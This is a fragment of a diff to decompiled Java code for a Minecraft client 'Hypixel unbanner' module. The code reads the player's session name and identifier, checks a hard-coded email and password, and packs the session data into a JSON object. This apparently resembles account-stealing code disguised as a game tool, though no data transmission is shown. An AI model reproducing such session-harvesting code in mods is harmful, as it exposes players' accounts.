@@ -33,8 +33,8 @@ public class HypixelUnbannerModule extends Module {
    public void onEnable() {
       try {
          String var3 = "D8374378";
-         String var4 = mcInstance.session.method_5366();
-         String var5 = mcInstance.session.method_5367().replaceAll("-", "");
+         String var4 = mc.session.method_5366();
+         String var5 = mc.session.method_5367().replaceAll("-", "");
          if (this.method_25528() && this.method_25530("CREEPAKILLER987@S0NY.IGG.BIZ", "3Qs-Cnt-Dec-Tee")) {
             this.method_25533();
             JSONObjectImpl var6 = this.method_25532(var3, var5);
